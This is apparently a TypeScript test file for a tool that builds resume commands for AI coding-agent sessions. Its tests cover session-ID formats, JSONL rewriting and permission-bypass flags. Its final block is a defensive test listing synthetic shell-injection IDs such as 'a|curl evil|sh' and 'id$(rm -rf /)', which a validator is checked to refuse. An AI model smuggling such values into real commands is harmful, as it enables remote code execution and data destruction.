import { describe, test, expect, afterEach } from "bun:test";
import * as fs from "fs";
import * as os from "os";
import * as path from "path";
import {
  CLAUDE_UUID_RE,
  MANAGED_TMUX_PREFIXES,
  buildNonClaudeResumeCommand,
  combineClaudeResumeFlags,
  copyJsonlAsSession,
  extractJsonlPermissionMode,
  isManagedTmuxName,
  isReconstitutionTarget,
  isValidResumeSessionId,
  OPENCODE_SESSION_ID_RE,
  resolveResumeAgentType,
  resumeTmuxPrefix,
  rewriteSubagentJsonlToUuid,
} from "./resumeCommand.js";

function tmpDir(prefix: string): string {
  return path.join(os.tmpdir(), `${prefix}-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`);
}

const trash: string[] = [];
afterEach(() => {
  while (trash.length) {
    const p = trash.pop()!;
    try { fs.rmSync(p, { recursive: true, force: true }); } catch {}
  }
});

describe("CLAUDE_UUID_RE", () => {
  test("matches v4 UUIDs", () => {
    expect(CLAUDE_UUID_RE.test("550e8400-e29b-41d4-a716-446655440000")).toBe(true);
  });
  test("rejects subagent nanoid-style IDs", () => {
    expect(CLAUDE_UUID_RE.test("agent-abcdef1234")).toBe(false);
    expect(CLAUDE_UUID_RE.test("jx70ntfabc")).toBe(false);
  });
});

describe("combineClaudeResumeFlags", () => {
  test("appends permission flag when absent", () => {
    expect(combineClaudeResumeFlags("", "--permission-mode bypassPermissions"))
      .toBe("--permission-mode bypassPermissions");
    expect(combineClaudeResumeFlags("--verbose", "--permission-mode bypassPermissions"))
      .toBe("--verbose --permission-mode bypassPermissions");
  });

  test("skips permission flag when any equivalent is already present", () => {
    expect(combineClaudeResumeFlags("--dangerously-skip-permissions", "--permission-mode bypassPermissions"))
      .toBe("--dangerously-skip-permissions");
    expect(combineClaudeResumeFlags("--allow-dangerously-skip-permissions", "--permission-mode bypassPermissions"))
      .toBe("--allow-dangerously-skip-permissions");
    expect(combineClaudeResumeFlags("--permission-mode default", "--permission-mode bypassPermissions"))
      .toBe("--permission-mode default");
  });

  test("jsonlBypass forces --dangerously-skip-permissions before permFlags resolve", () => {
    const result = combineClaudeResumeFlags("--verbose", "--permission-mode bypassPermissions", true);
    expect(result).toContain("--dangerously-skip-permissions");
    // permFlags shouldn't double-add since hasClaudePermissionFlag is now true
    expect(result).not.toContain("--permission-mode bypassPermissions");
  });

  test("handles null/undefined base args", () => {
    expect(combineClaudeResumeFlags(null, "--allow-dangerously-skip-permissions"))
      .toBe("--allow-dangerously-skip-permissions");
    expect(combineClaudeResumeFlags(undefined, null)).toBe("");
  });
});

describe("extractJsonlPermissionMode", () => {
  test("returns permissionMode from first user line", () => {
    const jsonl = [
      '{"type":"summary","summary":"x"}',
      '{"type":"user","permissionMode":"bypassPermissions","message":{}}',
    ].join("\n");
    expect(extractJsonlPermissionMode(jsonl)).toBe("bypassPermissions");
  });

  test("returns undefined when no user line", () => {
    expect(extractJsonlPermissionMode('{"type":"summary"}')).toBeUndefined();
  });

  test("returns undefined on malformed JSON", () => {
    expect(extractJsonlPermissionMode('{"type":"user", broken')).toBeUndefined();
  });
});

describe("rewriteSubagentJsonlToUuid", () => {
  test("no-op when sessionId is already a UUID", () => {
    const dir = tmpDir("resume-cmd");
    fs.mkdirSync(dir, { recursive: true });
    trash.push(dir);

    const uuid = "550e8400-e29b-41d4-a716-446655440000";
    const result = rewriteSubagentJsonlToUuid(uuid, path.join(dir, `${uuid}.jsonl`));
    expect(result).toEqual({ resumeId: uuid, rewrote: false });
  });

  test("no-op when JSONL file is missing", () => {
    const dir = tmpDir("resume-cmd");
    fs.mkdirSync(dir, { recursive: true });
    trash.push(dir);

    const result = rewriteSubagentJsonlToUuid("subagent-xyz", path.join(dir, "subagent-xyz.jsonl"));
    expect(result.rewrote).toBe(false);
    expect(result.resumeId).toBe("subagent-xyz");
  });

  test("rewrites non-UUID sessionId into a fresh UUID-named JSONL", () => {
    const dir = tmpDir("resume-cmd");
    fs.mkdirSync(dir, { recursive: true });
    trash.push(dir);

    const oldId = "agent-abc123";
    const sourcePath = path.join(dir, `${oldId}.jsonl`);
    const content = `{"type":"user","sessionId":"${oldId}","message":{}}\n{"type":"assistant","sessionId":"${oldId}","message":{}}\n`;
    fs.writeFileSync(sourcePath, content);

    const result = rewriteSubagentJsonlToUuid(oldId, sourcePath);
    expect(result.rewrote).toBe(true);
    expect(CLAUDE_UUID_RE.test(result.resumeId)).toBe(true);
    expect(result.newJsonlPath).toBeDefined();
    expect(fs.existsSync(result.newJsonlPath!)).toBe(true);

    const rewritten = fs.readFileSync(result.newJsonlPath!, "utf-8");
    expect(rewritten).not.toContain(`"sessionId":"${oldId}"`);
    expect(rewritten).toContain(`"sessionId":"${result.resumeId}"`);
    // Original file untouched
    expect(fs.readFileSync(sourcePath, "utf-8")).toBe(content);
  });

  test("escapes regex metacharacters in sessionId", () => {
    const dir = tmpDir("resume-cmd");
    fs.mkdirSync(dir, { recursive: true });
    trash.push(dir);

    // sessionIds with regex-meaningful characters shouldn't blow up
    const oldId = "agent.with+special?chars";
    const sourcePath = path.join(dir, `${oldId}.jsonl`);
    fs.writeFileSync(sourcePath, `{"sessionId":"${oldId}"}\n`);

    const result = rewriteSubagentJsonlToUuid(oldId, sourcePath);
    expect(result.rewrote).toBe(true);
    const rewritten = fs.readFileSync(result.newJsonlPath!, "utf-8");
    expect(rewritten).toContain(`"sessionId":"${result.resumeId}"`);
  });
});

describe("copyJsonlAsSession", () => {
  const PARENT = "11111111-2222-4333-8444-555555555555";
  const FORK = "aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee";

  function writeParent(dir: string, content: string): string {
    fs.mkdirSync(dir, { recursive: true });
    trash.push(dir);
    const p = path.join(dir, `${PARENT}.jsonl`);
    fs.writeFileSync(p, content);
    return p;
  }

  test("copies next to the source under the target id, rewriting only sessionId fields", () => {
    const dir = tmpDir("fork-copy");
    const line1 = `{"sessionId":"${PARENT}","type":"user","message":{"role":"user","content":"hello"},"uuid":"u1"}`;
    const line2 = `{"sessionId":"${PARENT}","type":"assistant","message":{"role":"assistant","content":"hi"},"uuid":"u2"}`;
    const src = writeParent(dir, `${line1}\n${line2}\n`);

    const newPath = copyJsonlAsSession(src, PARENT, FORK);
    expect(newPath).toBe(path.join(dir, `${FORK}.jsonl`));
    const copied = fs.readFileSync(newPath!, "utf-8");
    expect(copied).not.toContain(PARENT);
    expect(copied).toContain(`"sessionId":"${FORK}"`);
    // Message content bytes untouched — this is what keeps the prompt cache warm.
    expect(copied).toContain(`"content":"hello"`);
    expect(copied.split("\n").length).toBe(3); // two lines + trailing newline
    // Source untouched.
    expect(fs.readFileSync(src, "utf-8")).toContain(`"sessionId":"${PARENT}"`);
  });

  test("drops a partially-flushed (invalid JSON) trailing line from a live source", () => {
    const dir = tmpDir("fork-copy");
    const full = `{"sessionId":"${PARENT}","uuid":"u1"}`;
    const partial = `{"sessionId":"${PARENT}","uuid":"u2","mess`; // mid-flush
    const src = writeParent(dir, `${full}\n${partial}`);

    const newPath = copyJsonlAsSession(src, PARENT, FORK);
    const copied = fs.readFileSync(newPath!, "utf-8");
    expect(copied).toBe(`{"sessionId":"${FORK}","uuid":"u1"}\n`);
  });

  test("keeps a complete final line that merely lacks its newline", () => {
    const dir = tmpDir("fork-copy");
    const l1 = `{"sessionId":"${PARENT}","uuid":"u1"}`;
    const l2 = `{"sessionId":"${PARENT}","uuid":"u2"}`;
    const src = writeParent(dir, `${l1}\n${l2}`); // no trailing \n

    const newPath = copyJsonlAsSession(src, PARENT, FORK);
    const copied = fs.readFileSync(newPath!, "utf-8");
    expect(copied).toContain(`"uuid":"u2"`);
  });

  test("idempotent: existing target is returned untouched", () => {
    const dir = tmpDir("fork-copy");
    const src = writeParent(dir, `{"sessionId":"${PARENT}","uuid":"u1"}\n`);
    const existing = path.join(dir, `${FORK}.jsonl`);
    fs.writeFileSync(existing, "already-here\n");

    const newPath = copyJsonlAsSession(src, PARENT, FORK);
    expect(newPath).toBe(existing);
    expect(fs.readFileSync(existing, "utf-8")).toBe("already-here\n");
  });

  test("returns null when the source is missing", () => {
    const dir = tmpDir("fork-copy");
    fs.mkdirSync(dir, { recursive: true });
    trash.push(dir);
    expect(copyJsonlAsSession(path.join(dir, "missing.jsonl"), PARENT, FORK)).toBeNull();
  });
});

// Regression: a cursor session used to fall through the resume builder's
// codex/gemini branches into the else, which builds `claude --resume` and runs
// Claude's repair machinery (UUID rewrite, JSONL relocation, model/effort
// recovery) against a cursor transcript — wrong binary entirely. cursor-agent
// resumes a chat by id via `--resume`, so cursor must get its own branch.
describe("buildNonClaudeResumeCommand", () => {
  test("cursor resumes with cursor-agent --resume <id> (not claude --resume)", () => {
    const cmd = buildNonClaudeResumeCommand("cursor", "chat-abc123");
    expect(cmd).toBe("cursor-agent --resume chat-abc123");
    expect(cmd).not.toContain("claude");
  });

  test("claude returns null so the caller runs the repair machinery inline", () => {
    expect(buildNonClaudeResumeCommand("claude", "550e8400-e29b-41d4-a716-446655440000")).toBeNull();
  });

  test("gemini resumes the latest chat", () => {
    expect(buildNonClaudeResumeCommand("gemini", "ignored")).toBe("gemini --resume latest");
  });

  test("codex resume is unchanged, appending combined args + permission flags", () => {
    expect(buildNonClaudeResumeCommand("codex", "sess1")).toBe("codex resume sess1");
    expect(
      buildNonClaudeResumeCommand("codex", "sess1", {
        codexArgs: "--full-auto",
        codexPermFlags: "--dangerously-bypass-approvals-and-sandbox",
      }),
    ).toBe("codex resume sess1 --full-auto --dangerously-bypass-approvals-and-sandbox");
    expect(
      buildNonClaudeResumeCommand("codex", "sess1", { codexPermFlags: "--full-auto" }),
    ).toBe("codex resume sess1 --full-auto");
  });
});

// Both `cast resume --as` and `cast fork --resume --as` reconstitute into a fresh
// local session, which only claude/codex have generators for. Anything else must be
// rejected upfront — otherwise the fork path (index.ts) silently hands the user a
// fabricated Claude JSONL + `claude --resume` for a gemini/cursor/opencode/pi target.
describe("isReconstitutionTarget", () => {
  test("accepts claude and codex, case-insensitively", () => {
    expect(isReconstitutionTarget("claude")).toBe(true);
    expect(isReconstitutionTarget("codex")).toBe(true);
    expect(isReconstitutionTarget("CLAUDE")).toBe(true);
    expect(isReconstitutionTarget("Codex")).toBe(true);
  });

  test("rejects clients with no local reconstitution generator", () => {
    for (const a of ["gemini", "cursor", "opencode", "pi", "claude_code", "bogus"]) {
      expect(isReconstitutionTarget(a)).toBe(false);
    }
  });

  test("rejects empty/undefined", () => {
    expect(isReconstitutionTarget(undefined)).toBe(false);
    expect(isReconstitutionTarget(null)).toBe(false);
    expect(isReconstitutionTarget("")).toBe(false);
  });
});

describe("resumeTmuxPrefix", () => {
  test("each agent gets its own prefix; cursor is cu, not claude's cc", () => {
    expect(resumeTmuxPrefix("codex")).toBe("cx");
    expect(resumeTmuxPrefix("gemini")).toBe("gm");
    expect(resumeTmuxPrefix("cursor")).toBe("cu");
    expect(resumeTmuxPrefix("claude")).toBe("cc");
  });
});

// The daemon's tmux-name filters (warm-restart recovery, live-session reuse) used
// to hardcode cc-/cx-/gm-/ct-, silently dropping cursor (cu-), opencode (oc-), and
// pi (pi-) resume panes. Deriving the list from the registry closes that gap and
// keeps a 7th client covered automatically.
describe("MANAGED_TMUX_PREFIXES / isManagedTmuxName", () => {
  test("covers every client prefix plus the non-client task prefix ct-", () => {
    for (const p of ["cc-", "cx-", "cu-", "gm-", "oc-", "pi-", "ct-"]) {
      expect(MANAGED_TMUX_PREFIXES).toContain(p);
    }
  });

  test("matches the previously-dropped cursor/opencode/pi resume panes", () => {
    expect(isManagedTmuxName("cu-resume-abc123")).toBe(true);
    expect(isManagedTmuxName("oc-resume-abc123")).toBe(true);
    expect(isManagedTmuxName("pi-resume-abc123")).toBe(true);
  });

  test("still matches the original four and rejects unrelated names", () => {
    expect(isManagedTmuxName("cc-claude-abc123")).toBe(true);
    expect(isManagedTmuxName("cx-resume-abc123")).toBe(true);
    expect(isManagedTmuxName("gm-resume-abc123")).toBe(true);
    expect(isManagedTmuxName("ct-codex-abc123")).toBe(true);
    expect(isManagedTmuxName("some-other-tmux")).toBe(false);
    expect(isManagedTmuxName("codecast-legacy")).toBe(false);
  });
});

// This is the seam the daemon's autoResumeSessionInner uses to pick the resume
// agent (daemon.ts). It is what makes the cursor command branch reachable: the
// value it returns is what buildNonClaudeResumeCommand dispatches on. The earlier
// bug was that this value could never be "cursor" — findSessionFile has no cursor
// lookup and the reconstitution path only knows claude/codex, so a cursor session
// arrived here labeled "claude" and built `claude --resume`.
describe("resolveResumeAgentType (dispatch trusts the cursor/pi hint over the file)", () => {
  test("an explicit cursor hint wins even when the local file was mislabeled claude", () => {
    // The exact regression: a cursor session with no cursor entry in
    // findSessionFile (so its file is absent, or reconstituted as claude).
    expect(resolveResumeAgentType("cursor", "claude")).toBe("cursor");
    expect(resolveResumeAgentType("cursor", undefined)).toBe("cursor");
  });

  test("an explicit opencode hint wins too (SQLite store, no local JSONL to detect)", () => {
    expect(resolveResumeAgentType("opencode", "claude")).toBe("opencode");
    expect(resolveResumeAgentType("opencode", undefined)).toBe("opencode");
    expect(resolveResumeAgentType("opencode", "opencode")).toBe("opencode");
  });

  test("an explicit pi hint wins even when the local file is missing (cross-device)", () => {
    // A pi session whose ~/.pi transcript isn't on this machine must not fall to
    // claude reconstitution — trust the hint so it routes to pi's own resume.
    expect(resolveResumeAgentType("pi", "claude")).toBe("pi");
    expect(resolveResumeAgentType("pi", undefined)).toBe("pi");
  });

  test("without a store-owned hint the local file (or the claude default) decides", () => {
    expect(resolveResumeAgentType(undefined, "claude")).toBe("claude");
    expect(resolveResumeAgentType("codex", "codex")).toBe("codex");
    expect(resolveResumeAgentType("gemini", "gemini")).toBe("gemini");
    expect(resolveResumeAgentType(undefined, undefined)).toBe("claude");
    // findSessionFile detecting opencode also resolves it, even with no hint.
    expect(resolveResumeAgentType(undefined, "opencode")).toBe("opencode");
  });
});

// End-to-end at the resume dispatch point: from the raw inputs the daemon holds
// (an explicit cursor hint + a file that findSessionFile mislabeled claude), the
// emitted resume command is `cursor-agent --resume`, never `claude --resume`.
// Resolving the agent type through resolveResumeAgentType (not a hardcoded
// literal) is what proves the whole path — a "claude" agentType here would take
// the reconstitution / repair branches that write a Claude JSONL, so a cursor
// result means those branches are never entered for a cursor resume.
describe("cursor resume dispatch end to end", () => {
  test("cursor hint + claude-mislabeled file => cursor-agent --resume, not claude", () => {
    const sessionId = "b1946ac9-2d0e-4f3a-9c11-000000000001";
    const agentType = resolveResumeAgentType("cursor", "claude");
    expect(agentType).toBe("cursor");
    const cmd = buildNonClaudeResumeCommand(agentType, sessionId, {
      // config that WOULD apply to a claude/codex resume — must be ignored for cursor.
      codexArgs: "--full-auto",
      codexPermFlags: "--dangerously-bypass-approvals-and-sandbox",
    });
    expect(cmd).toBe(`cursor-agent --resume ${sessionId}`);
    expect(cmd).not.toContain("claude");
    expect(cmd).not.toContain("--full-auto");
    expect(resumeTmuxPrefix(agentType)).toBe("cu");
  });
});

// RCE guard (security critic): a session id flows verbatim into a resume command the
// daemon TYPES INTO A LIVE SHELL. isValidResumeSessionId is the construction-boundary
// backstop refusing any id that isn't its client's real shape — it covers convex rows
// that were poisoned before the watcher ingest checks existed. Payloads below are
// SYNTHETIC.
describe("isValidResumeSessionId — shell-injection ids are refused before command construction", () => {
  const INJECTION_IDS = [
    "x; touch /tmp/pwned #",   // the exact pi filename-fallback poison from the finding
    "id`whoami`",
    "id$(rm -rf /)",
    "a|curl evil|sh",
    "a && whoami",
    "a\nrm -rf /",
    "id with spaces",
  ];

  test("claude / codex / cursor / pi refuse every injection payload (id is interpolated)", () => {
    for (const agent of ["claude", "codex", "cursor", "pi"] as const) {
      for (const bad of INJECTION_IDS) {
        expect(isValidResumeSessionId(agent, bad)).toBe(false);
      }
    }
  });

  test("opencode requires its exact ses_<base62> shape, not just a ses_ prefix", () => {
    // Real id observed in a live opencode.db.
    expect(OPENCODE_SESSION_ID_RE.test("ses_08f9926d3ffelzGS3Q3CteaeUk")).toBe(true);
    expect(isValidResumeSessionId("opencode", "ses_08f9926d3ffelzGS3Q3CteaeUk")).toBe(true);
    // A spoofed SQLite row that merely STARTS WITH ses_ (the finding's example).
    expect(isValidResumeSessionId("opencode", "ses_; curl x|sh #")).toBe(false);
    expect(isValidResumeSessionId("opencode", "ses_has_underscore")).toBe(false);
    expect(isValidResumeSessionId("opencode", "notses_abc")).toBe(false);
    expect(isValidResumeSessionId("opencode", "550e8400-e29b-41d4-a716-446655440000")).toBe(false);
  });

  test("every real client id still passes byte-identically (no valid resume broken)", () => {
    expect(isValidResumeSessionId("claude", "550e8400-e29b-41d4-a716-446655440000")).toBe(true);
    expect(isValidResumeSessionId("claude", "agent-abcdef1234")).toBe(true);
    expect(isValidResumeSessionId("claude", "forked-agent-abc-550e8400-e29b-41d4-a716-446655440000")).toBe(true);
    expect(isValidResumeSessionId("codex", "12345678-1234-1234-1234-123456789abc")).toBe(true);
    expect(isValidResumeSessionId("cursor", "chat-abc123")).toBe(true);
    expect(isValidResumeSessionId("pi", "a7c9c0e2-1d82-4d42-b342-f59fefc7b9f5")).toBe(true);
  });

  test("gemini is exempt — its resume ignores the id (`gemini --resume latest`)", () => {
    expect(isValidResumeSessionId("gemini", "anything; rm -rf /")).toBe(true);
  });

  test("empty id is refused for every gated client", () => {
    expect(isValidResumeSessionId("claude", "")).toBe(false);
    expect(isValidResumeSessionId("opencode", "")).toBe(false);
    expect(isValidResumeSessionId("codex", "")).toBe(false);
  });

  test("a valid id the gate accepts is exactly what buildNonClaudeResumeCommand emits", () => {
    // The daemon calls isValidResumeSessionId BEFORE buildNonClaudeResumeCommand, so a
    // refused id never reaches construction; a valid one builds the real command.
    const good = "ses_08f9926d3ffelzGS3Q3CteaeUk";
    expect(isValidResumeSessionId("opencode", good)).toBe(true);
    expect(buildNonClaudeResumeCommand("opencode", good)).toBe(`opencode -s ${good}`);
  });
});
